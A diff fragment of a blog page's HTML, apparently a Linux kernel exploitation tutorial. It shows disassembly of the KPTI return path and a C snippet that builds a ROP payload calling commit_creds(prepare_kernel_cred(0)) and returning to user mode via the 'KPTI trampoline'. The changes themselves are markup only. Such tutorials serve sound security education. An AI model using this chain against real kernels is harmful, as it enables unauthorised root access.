+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F41                 push    qword ptr <span class="o">[</span>rdi<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F43                 push    rax
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>As you can see, it first recovers a lot of registers by popping from the stack. However, what we are actually interested in is the parts where it swaps the page tables, <code>swapgs</code> and <code>iretq</code>, and not this part. Simply ROP into the start of this function works fine, but it will unnecessarily enlarge our ROP chain due to a lot of dummy registers need to be inserted. As a result, our <code>KPTI trampoline</code> will be at <code>swapgs_restore_regs_and_return_to_usermode + 22</code> instead, which is the address of the first <code>mov</code>.</p>
 <p>After the initial registers restoration, below are the parts that are useful to us:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:
-.text:FFFFFFFF81200F89                               pop     rax
-.text:FFFFFFFF81200F8A                               pop     rdi
-.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088
-.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080
-...
-.text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp
-.text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp
-.text.native_swapgs:FFFFFFFF8146D4E4                 swapgs
-.text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp
-.text.native_swapgs:FFFFFFFF8146D4E8                 retn
-...
-.text:FFFFFFFF8120102E                               mov     rdi, cr3
-.text:FFFFFFFF81201031                               jmp     short loc_FFFFFFFF81201067
-...
-.text:FFFFFFFF81201067                               or      rdi, 1000h
-.text:FFFFFFFF8120106E                               mov     cr3, rdi
-...
-.text:FFFFFFFF81200FC7                               iretq
-</code></pre></div><p>Notice that there are 2 extra pops at the start, so we still have to put in our chain 2 dummy values. The other snippets is where it <code>swapgs</code>, swaps page tables by modifying control register <code>CR3</code>, and finally <code>iretq</code>. We will tweak the final part of our ROP chain from <code>SWAPGS|IRETQ|RIP|CS|RFLAGS|SP|SS</code> to <code>KPTI_trampoline|dummy RAX|dummy RDI|RIP|CS|RFLAGS|SP|SS</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="c1">// ...
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span> <span class="c1">// commit_creds(prepare_kernel_cred(0))
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_trampoline</span><span class="p">;</span> <span class="c1">// swapgs_restore_regs_and_return_to_usermode + 22
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rax
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rdi
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
-    <span class="c1">// ...
-</span><span class="c1"></span><span class="p">}</span>
-</code></pre></div><div class="details admonition tip open">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F89                               pop     rax
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F8A                               pop     rdi
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">.text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp
+</span></span><span class="line"><span class="cl">.text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp
+</span></span><span class="line"><span class="cl">.text.native_swapgs:FFFFFFFF8146D4E4                 swapgs
+</span></span><span class="line"><span class="cl">.text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp
+</span></span><span class="line"><span class="cl">.text.native_swapgs:FFFFFFFF8146D4E8                 retn
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF8120102E                               mov     rdi, cr3
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81201031                               jmp     short loc_FFFFFFFF81201067
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81201067                               or      rdi, 1000h
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF8120106E                               mov     cr3, rdi
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200FC7                               iretq
+</span></span></code></pre></div><p>Notice that there are 2 extra pops at the start, so we still have to put in our chain 2 dummy values. The other snippets is where it <code>swapgs</code>, swaps page tables by modifying control register <code>CR3</code>, and finally <code>iretq</code>. We will tweak the final part of our ROP chain from <code>SWAPGS|IRETQ|RIP|CS|RFLAGS|SP|SS</code> to <code>KPTI_trampoline|dummy RAX|dummy RDI|RIP|CS|RFLAGS|SP|SS</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span> <span class="c1">// commit_creds(prepare_kernel_cred(0))
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_trampoline</span><span class="p">;</span> <span class="c1">// swapgs_restore_regs_and_return_to_usermode + 22
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rdi
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><div class="details admonition tip open">
         <div class="details-summary admonition-title">
             <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
         </div>
@@ -446,7 +454,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.83.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.99.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
